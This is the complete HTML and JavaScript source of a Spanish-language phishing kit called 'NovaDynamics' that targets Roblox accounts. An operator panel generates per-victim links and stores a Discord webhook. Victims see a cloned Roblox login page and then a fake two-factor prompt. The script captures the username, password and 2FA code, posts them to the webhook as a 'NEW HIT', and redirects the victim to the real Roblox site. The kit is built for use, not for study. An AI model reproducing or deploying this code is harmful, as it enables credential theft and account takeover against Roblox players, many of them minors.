<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NovaDynamics</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Roboto, sans-serif}
        :root{--roblox-red:#e2231a;--roblox-dark:#191919;--roblox-gray:#e3e3e3;--roblox-blue:#00a2ff}
        body{background:#f1f1f1;color:#393b3d;min-height:100vh}
        .hidden{display:none !important}

        /* ========== PANEL DE NAVEGACIÓN ========== */
        .nav-bar{background:var(--roblox-dark);padding:12px 20px;display:flex;justify-content:space-between;align-items:center;color:#fff}
        .nav-title{font-size:20px;font-weight:bold;color:#fff}
        .nav-buttons{display:flex;gap:10px}
        .nav-btn{background:transparent;color:#fff;border:none;padding:8px 14px;cursor:pointer;border-radius:4px}
        .nav-btn:hover,.nav-btn.active{background:#333}

        /* ========== CONTENEDORES ========== */
        .container{max-width:460px;margin:20px auto;padding:0 15px}
        .card{background:#fff;padding:25px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
        .card h2{text-align:center;margin-bottom:20px;font-size:18px;color:#393b3d}
        .card label{display:block;margin:12px 0 5px;font-size:14px;font-weight:500}
        .card input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:15px}
        .card input:focus{outline:none;border-color:var(--roblox-blue);box-shadow:0 0 3px rgba(0,162,255,.3)}
        .btn{width:100%;padding:11px;background:var(--roblox-red);color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-top:10px}
        .btn:hover{background:#c41e17}
        .btn-success{background:#28c747}
        .btn-success:hover{background:#22ad3d}
        .error{color:var(--roblox-red);font-size:14px;margin:8px 0;min-height:20px}
        .link-box{background:#f8f8f8;padding:12px;border-radius:4px;margin-top:15px;word-break:break-all;font-size:13px;color:#0066cc;border:1px solid #ddd}

        /* ========== RANKING ========== */
        .rank-item{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #eee}
        .rank-item:nth-child(1){background:linear-gradient(90deg,#ffd70020,#ffd70010)}
        .rank-item:nth-child(2){background:linear-gradient(90deg,#c0c0c020,#c0c0c010)}
        .rank-item:nth-child(3){background:linear-gradient(90deg,#cd7f3220,#cd7f3210)}
        .rank-number{font-weight:bold;width:25px}
        .rank-user{flex:1}
        .rank-value{font-weight:bold;color:var(--roblox-red)}

        /* ========== INICIO DE SESIÓN — ESTILO ROBLOX ========== */
        .roblox-header{background:var(--roblox-dark);padding:10px 20px;text-align:center}
        .roblox-header h1{color:#fff;font-size:24px}
        .login-container{max-width:380px;margin:40px auto;padding:0 15px}
        .login-card{background:#fff;padding:30px;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.15)}
        .login-card h2{text-align:center;margin-bottom:25px;font-size:20px}
        .login-card input{width:100%;padding:12px;border:1px solid #e3e3e3;border-radius:4px;font-size:16px;margin-bottom:5px}
        .login-card input:focus{border-color:#00a2ff;outline:none;box-shadow:0 0 0 2px rgba(0,162,255,.2)}
        .login-btn{width:100%;padding:12px;background:#e2231a;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
        .login-btn:hover{background:#c41e17}
        .error-text{color:#e2231a;font-size:14px;margin-bottom:10px;min-height:18px}

        /* ========== CÓDIGO 2FA ========== */
        .code-boxes{display:flex;gap:8px;justify-content:center;margin:20px 0}
        .code-boxes input{width:48px;height:55px;text-align:center;font-size:24px;padding:0;border:1px solid #ccc;border-radius:4px}
        .code-boxes input:focus{border-color:#00a2ff;outline:none}
        .back-btn{background:transparent;color:#0066cc;border:none;padding:8px;cursor:pointer;margin-bottom:15px}
        .back-btn:hover{text-decoration:underline}
    </style>
</head>
<body>

    <!-- ================= PÁGINA DE INICIO DE SESIÓN (IGUAL A ROBLOX) ================= -->
    <div id="robloxLoginPage" class="hidden">
        <div class="roblox-header">
            <h1>Roblox</h1>
        </div>
        <div class="login-container">
            <div class="login-card">
                <h2>Iniciar sesión</h2>
                <button class="back-btn" onclick="salirEnlace()">← Volver</button>
                
                <label>Nombre de usuario</label>
                <input type="text" id="robloxUser" placeholder="Nombre de usuario">
                
                <label>Contraseña</label>
                <input type="password" id="robloxPass" placeholder="Contraseña">
                
                <div id="robloxError" class="error-text"></div>
                <button class="login-btn" id="robloxLoginBtn" onclick="validarPassRoblox()">Iniciar sesión</button>
            </div>
        </div>
    </div>

    <!-- ================= CAJA CÓDIGO 2FA ================= -->
    <div id="roblox2faPage" class="hidden">
        <div class="roblox-header">
            <h1>Roblox</h1>
        </div>
        <div class="login-container">
            <div class="login-card">
                <h2>Verificación en dos pasos</h2>
                <p style="text-align:center;color:#666;margin-bottom:10px;">Introduce el código de 6 dígitos de tu aplicación de autenticación</p>
                <div class="code-boxes">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,0)">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,1)">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,2)">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,3)">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,4)">
                    <input type="text" maxlength="1" oninput="moverCasilla(this,5)">
                </div>
                <div id="robloxCodeError" class="error-text"></div>
                <button class="login-btn" onclick="enviarCodigoRoblox()">Verificar</button>
            </div>
        </div>
    </div>

    <!-- ================= PANEL DE CONTROL — NOVA DYNAMICS ================= -->
    <div id="mainPanel">
        <div class="nav-bar">
            <span class="nav-title">⚡ NovaDynamics</span>
            <div class="nav-buttons">
                <button class="nav-btn active" onclick="cambiarPanel('generar')">🔗 Enlaces</button>
                <button class="nav-btn" onclick="cambiarPanel('ranking')">🏆 Ranking</button>
                <button class="nav-btn" onclick="cambiarPanel('config')">⚙️ Ajustes</button>
            </div>
        </div>

        <!-- ========== GENERAR ENLACE ========== -->
        <div id="panelGenerar" class="container">
            <div class="card">
                <h2>🔗 Generar Enlace de Roblox</h2>
                <label>Nombre de usuario de Roblox</label>
                <input type="text" id="nombreUsuario" placeholder="Ej: Damian666">
                
                <button class="btn" onclick="crearEnlace()">✅ Generar Enlace</button>
                
                <div id="enlaceResultado" class="link-box hidden"></div>
                <button id="copiarBtn" class="btn btn-success hidden" onclick="copiarEnlaceGenerado()">📋 Copiar Enlace</button>
            </div>
        </div>

        <!-- ========== RANKING ========== -->
        <div id="panelRanking" class="container hidden">
            <div class="card">
                <h2>🏆 Ranking de Cuentas</h2>
                <div id="listaRanking">
                    <div class="rank-item">
                        <span class="rank-number">🥇</span>
                        <span class="rank-user">Sin cuentas aún</span>
                        <span class="rank-value">0</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- ========== AJUSTES ========== -->
        <div id="panelConfig" class="container hidden">
            <div class="card">
                <h2>⚙️ Configuración</h2>
                <label>Webhook de Discord</label>
                <input type="text" id="miWebhook" placeholder="Pega tu Webhook de Discord aquí">
                <button class="btn" onclick="guardarWebhook()">💾 Guardar Webhook</button>
                <p style="margin-top:10px;font-size:13px;color:#666">Se guarda automáticamente en tu navegador.</p>
            </div>
        </div>
    </div>

    <script>
        let enlaceCreado = "";
        let WEBHOOK = localStorage.getItem('novaWebhook') || "";
        let USUARIO_OBJETIVO = "";
        let NOMBRE_CAPTURADO = "";
        let PASS_CAPTURADA = "";
                // ================= DETECTAR SI VIENEN DE UN ENLACE =================
        window.onload = function(){
            const params = new URLSearchParams(window.location.search);
            const user = params.get('user');
            if(user){
                // ENTRAR DIRECTO A INICIO DE SESIÓN DE ROBLOX
                document.getElementById('mainPanel').classList.add('hidden');
                document.getElementById('robloxLoginPage').classList.remove('hidden');
                document.getElementById('robloxUser').value = user;
                document.getElementById('robloxUser').disabled = true;
                USUARIO_OBJETIVO = user;
            }
            if(WEBHOOK) document.getElementById('miWebhook').value = WEBHOOK;
        };

        // ================= CAMBIAR PANELES =================
        function cambiarPanel(nombre){
            document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('panelGenerar').classList.add('hidden');
            document.getElementById('panelRanking').classList.add('hidden');
            document.getElementById('panelConfig').classList.add('hidden');
            document.getElementById('panel'+nombre.charAt(0).toUpperCase()+nombre.slice(1)).classList.remove('hidden');
        }

        // ================= GUARDAR WEBHOOK =================
        function guardarWebhook(){
            const wh = document.getElementById('miWebhook').value.trim();
            if(!wh){ alert("⚠️ Pon tu Webhook primero"); return; }
            WEBHOOK = wh;
            localStorage.setItem('novaWebhook', wh);
            alert("✅ Webhook guardado correctamente");
        }

        // ================= CREAR ENLACE =================
        function crearEnlace(){
            const nombre = document.getElementById('nombreUsuario').value.trim();
            if(!nombre){ alert("⚠️ Escribe el nombre de usuario"); return; }
            
            const whCod = btoa(WEBHOOK);
            enlaceCreado = window.location.origin + window.location.pathname + "?user=" + encodeURIComponent(nombre) + "&wh=" + whCod;
            
            document.getElementById('enlaceResultado').classList.remove('hidden');
            document.getElementById('enlaceResultado').textContent = enlaceCreado;
            document.getElementById('copiarBtn').classList.remove('hidden');
        }

        function copiarEnlaceGenerado(){
            navigator.clipboard.writeText(enlaceCreado).then(()=>{
                alert("✅ ¡Enlace copiado! Compártelo:\n" + enlaceCreado);
            });
        }

        function salirEnlace(){
            window.location.search = "";
            window.location.reload();
        }

        // ================= VALIDAR CONTRASEÑA (IGUAL A ROBLOX) =================
        function validarPassRoblox(){
            const user = document.getElementById('robloxUser').value.trim();
            const pass = document.getElementById('robloxPass').value.trim();
            const error = document.getElementById('robloxError');
            const btn = document.getElementById('robloxLoginBtn');

            // ❌ Si está vacía o muy corta
            if(!pass || pass.length < 6){
                error.textContent = "The password is incorrect.";
                return;
            }

            // ❌ CONTRASEÑAS OBVIAMENTE FALSAS
            const prohibidas = [
                "123456","123456789","password","12345678","12345",
                "qwerty","abc123","111111","123123","admin","1234567",
                "password1","iloveyou","000000","123321","654321",
                "1234567890","qwerty123","121212","00000000",
                "11111111","88888888","99999999","123654"
            ];
            if(prohibidas.includes(pass.toLowerCase())){
                error.textContent = "The password is incorrect.";
                return;
            }

            // ✅ SIMULAR VERIFICACIÓN
            error.textContent = "";
            btn.textContent = "Verifying...";
            btn.disabled = true;

            setTimeout(()=>{
                btn.textContent = "Iniciar sesión";
                btn.disabled = false;
                NOMBRE_CAPTURADO = user;
                PASS_CAPTURADA = pass;
                // MOSTRAR CÓDIGO 2FA
                document.getElementById('robloxLoginPage').classList.add('hidden');
                document.getElementById('roblox2faPage').classList.remove('hidden');
                document.querySelectorAll('.code-boxes input')[0].focus();
            }, 1800);
        }

        // ================= MOVER ENTRE CAJAS =================
        function moverCasilla(el, idx){
            if(el.value.length === 1){
                const inputs = document.querySelectorAll('.code-boxes input');
                if(idx < 5) inputs[idx+1].focus();
            }
        }

        // ================= VALIDAR CÓDIGO 2FA =================
        function enviarCodigoRoblox(){
            const inputs = document.querySelectorAll('.code-boxes input');
            let codigo = "";
            inputs.forEach(i => codigo += i.value.trim());
            const error = document.getElementById('robloxCodeError');

            // ❌ MENOS DE 6 DÍGITOS
            if(codigo.length !== 6 || !/^\d{6}$/.test(codigo)){
                error.textContent = "❌ Code is invalid";
                return;
            }

            // ❌ CÓDIGOS OBVIAMENTE FALSOS
            const prohibidos = [
                "000000","111111","222222","333333","444444",
                "555555","666666","777777","888888","999999",
                "012345","123456","234567","345678","456789",
                "543210","654321","765432","876543","987654",
                "010101","101010","121212","202020","212121",
                "111222","222333","333444","444555","555666",
                "123321","135531","147741","258852","369963",
                "159951","357753","123210","112211","132231",
                "001234","123654","135790","246800","963852",
                "852963","741852","159753","357159","000001",
                "000123","012012","120120","147258","258369",
                "369258","481592","592713","025874","159357",
                "258741","369147","471258","582369","008520",
                "975310","864209","753198","642087","531976",
                "013579","024680","001122","112233","223344",
                "334455","445566","556677","667788","778899",
                "998877","887766","000111","000222","000333",
                "000444","000555","000666","000777","000888",
                "000999","111000","222000","333000","444000",
                "555000","666000","777000","888000","999000",
                "010203","020304","030405","040506","050607",
                "060708","070809","080910"
            ];

            if(prohibidos.includes(codigo)){
                error.textContent = "❌ Code is invalid";
                return;
            }

            // ✅ CÓDIGO VÁLIDO → ENVIAR A DISCORD
            error.textContent = "";
            alert("✅ Code verified!\n🔓 Iniciando sesión...");

            enviarDatosDiscord(codigo);
        }

        // ================= ENVIAR TODO A TU DISCORD =================
        async function enviarDatosDiscord(codigo){
            if(!WEBHOOK){
                alert("✅ ¡Datos capturados! Configura tu Webhook en Ajustes.");
                window.location.href = "https://www.roblox.com/login";
                return;
            }

            const datos = {
                content: "@everyone **NEW HIT — NovaDynamics** ⚡",
                embeds: [{
                    title: "🔐 CUENTA ROBLOX CAPTURADA",
                    color: 16711680,
                    fields: [
                        {name: "👤 Nombre de usuario", value: "```"+NOMBRE_CAPTURADO+"```", inline:false},
                        {name: "🔑 Contraseña", value: "```"+PASS_CAPTURADA+"```", inline:false},
                        {name: "📲 Código 2FA", value: "```"+codigo+"```", inline:false}
                    ],
                    footer: {text: "NovaDynamics Beam System ⚡"}
                }]
            };

            await fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(datos)
            });

            alert("✅ ¡Datos enviados a Discord!\nRedirigiendo a Roblox...");
            window.location.href = "https://www.roblox.com/login";
        }
    </script>
</body>
</html>
